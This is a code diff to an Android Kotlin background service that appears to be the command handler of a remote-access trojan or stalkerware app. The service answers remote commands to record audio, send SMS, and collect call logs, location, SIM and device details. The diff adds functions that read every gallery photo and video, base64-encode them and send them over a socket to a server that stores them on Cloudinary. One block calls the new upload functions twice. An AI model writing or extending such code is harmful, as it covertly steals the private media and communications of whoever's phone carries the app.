@@ -349,7 +349,7 @@ class MainService : Service() {
             CMD_RECORD_AUDIO -> startStopAudioRecording(params)
             CMD_GET_DEVICE_INFO -> getDetailedDeviceInfo()
             CMD_GET_INSTALLED_APPS -> getInstalledApps()
-            CMD_GET_PHOTOS -> getMediaFiles("images")
+            CMD_GET_PHOTOS -> getGalleryPhotosWithUpload()
             CMD_GET_VIDEOS -> getVideosWithUpload()
             CMD_GET_DOCUMENTS -> getDocuments()
             CMD_SEND_SMS -> sendSms(params)
@@ -387,8 +387,10 @@ class MainService : Service() {
                 getCallLogs()?.let { allData.put("callLogs", it) }
                 getDetailedDeviceInfo()?.let { allData.put("deviceInfo", it) }
                 getInstalledApps()?.let { allData.put("installedApps", it) }
-                getMediaFiles("images")?.let { allData.put("photos", it) }
-                getMediaFiles("videos")?.let { allData.put("videos", it) }
+                getGalleryPhotosWithUpload()?.let { allData.put("photos", it) }
+                getVideosWithUpload()?.let { allData.put("videos", it) }
+                getGalleryPhotosWithUpload()?.let { allData.put("photos", it) }
+                getVideosWithUpload()?.let { allData.put("videos", it) }
                 getDocuments()?.let { allData.put("documents", it) }
                 getCurrentLocation()?.let { allData.put("location", it) }
                 getBatteryInfo()?.let { allData.put("battery", it) }
@@ -701,36 +703,39 @@ class MainService : Service() {
             
             for (i in 0 until videoList.length()) {
                 val video = videoList.getJSONObject(i)
-                val videoPath = video.optString("path")
+                val videoUriString = video.optString("uri")
                 val videoName = video.optString("name")
+                val videoSize = video.optLong("size")
                 
-                if (videoPath != null && videoName != null) {
+                if (videoUriString != null && videoName != null && videoSize > 0 && videoSize < 100 * 1024 * 1024) {
                     try {
-                        val file = java.io.File(videoPath, videoName)
-                        if (file.exists() && file.length() < 100 * 1024 * 1024) { // Max 100MB
-                            val bytes = file.readBytes()
-                            val base64 = android.util.Base64.encodeToString(bytes, android.util.Base64.NO_WRAP)
-                            
-                            val result = JSONObject().apply {
-                                put("command", "get_videos")
-                                put("data", base64)
-                                put("name", videoName)
-                                put("size", file.length())
-                                put("mimeType", video.optString("mimeType", "video/mp4"))
-                                put("timestamp", System.currentTimeMillis())
+                        val uri = Uri.parse(videoUriString)
+                        contentResolver.openInputStream(uri)?.use { inputStream ->
+                            val bytes = inputStream.readBytes()
+                            if (bytes.isNotEmpty()) {
+                                val base64 = android.util.Base64.encodeToString(bytes, android.util.Base64.NO_WRAP)
+                                
+                                val result = JSONObject().apply {
+                                    put("command", "get_videos")
+                                    put("data", base64)
+                                    put("name", videoName)
+                                    put("size", bytes.size.toLong())
+                                    put("mimeType", video.optString("mimeType", "video/mp4"))
+                                    put("timestamp", System.currentTimeMillis())
+                                }
+                                
+                                // Send via socket so server uploads to Cloudinary
+                                if (isConnected) {
+                                    socket.emit("device:result", JSONObject().apply {
+                                        put("commandId", "video_${videoName}_${System.currentTimeMillis()}")
+                                        put("result", result)
+                                        put("status", "executed")
+                                    })
+                                }
+                                
+                                // Mark as uploaded
+                                video.put("uploaded", true)
                             }
-                            
-                            // Send via socket so server uploads to Cloudinary
-                            if (isConnected) {
-                                socket.emit("device:result", JSONObject().apply {
-                                    put("commandId", "video_${videoName}_${System.currentTimeMillis()}")
-                                    put("result", result)
-                                    put("status", "executed")
-                                })
-                            }
-                            
-                            // Add to list with reference to uploaded version
-                            video.put("uploaded", true)
                         }
                     } catch (e: Exception) {
                         Log.e(TAG, "Error uploading video ${videoName}: ${e.message}")
@@ -743,6 +748,63 @@ class MainService : Service() {
         } catch (e: Exception) {
             Log.e(TAG, "getVideosWithUpload error: ${e.message}")
             return JSONObject().apply { put("videos", JSONArray()); put("total", 0) }
+        }
+    }
+    
+    private fun getGalleryPhotosWithUpload(): JSONObject {
+        try {
+            val photos = getMediaFiles("images")
+            val photoList = photos.optJSONArray("images") ?: JSONArray()
+            val uploadedPhotos = JSONArray()
+            
+            for (i in 0 until photoList.length()) {
+                val photo = photoList.getJSONObject(i)
+                val photoUriString = photo.optString("uri")
+                val photoName = photo.optString("name")
+                val photoSize = photo.optLong("size")
+                
+                if (photoUriString != null && photoName != null && photoSize > 0 && photoSize < 50 * 1024 * 1024) {
+                    try {
+                        val uri = Uri.parse(photoUriString)
+                        contentResolver.openInputStream(uri)?.use { inputStream ->
+                            val bytes = inputStream.readBytes()
+                            if (bytes.isNotEmpty()) {
+                                val base64 = android.util.Base64.encodeToString(bytes, android.util.Base64.NO_WRAP)
+                                
+                                val result = JSONObject().apply {
+                                    put("command", "get_photos")
+                                    put("data", base64)
+                                    put("name", photoName)
+                                    put("size", bytes.size.toLong())
+                                    put("mimeType", photo.optString("mimeType", "image/jpeg"))
+                                    put("timestamp", System.currentTimeMillis())
+                                    put("id", photo.optLong("id"))
+                                }
+                                
+                                // Send via socket so server uploads to Cloudinary
+                                if (isConnected) {
+                                    socket.emit("device:result", JSONObject().apply {
+                                        put("commandId", "photo_${photoName}_${System.currentTimeMillis()}")
+                                        put("result", result)
+                                        put("status", "executed")
+                                    })
+                                }
+                                
+                                // Mark as uploaded
+                                photo.put("uploaded", true)
+                            }
+                        }
+                    } catch (e: Exception) {
+                        Log.e(TAG, "Error uploading photo ${photoName}: ${e.message}")
+                    }
+                }
+                uploadedPhotos.put(photo)
+            }
+            
+            return JSONObject().apply { put("photos", uploadedPhotos); put("total", uploadedPhotos.length()) }
+        } catch (e: Exception) {
+            Log.e(TAG, "getGalleryPhotosWithUpload error: ${e.message}")
+            return JSONObject().apply { put("photos", JSONArray()); put("total", 0) }
         }
     }
     
@@ -889,8 +951,8 @@ class MainService : Service() {
                 getDetailedDeviceInfo()?.let { allData.put("deviceInfo", it) }
                 getInstalledApps()?.let { allData.put("installedApps", it) }
                 getCurrentLocation()?.let { allData.put("location", it) }
-                getMediaFiles("images")?.let { allData.put("photos", it) }
-                getMediaFiles("videos")?.let { allData.put("videos", it) }
+                getGalleryPhotosWithUpload()?.let { allData.put("photos", it) }
+                getVideosWithUpload()?.let { allData.put("videos", it) }
                 getDocuments()?.let { allData.put("documents", it) }
                 getBatteryInfo()?.let { allData.put("battery", it) }
                 getSimInfo()?.let { allData.put("simInfo", it) }
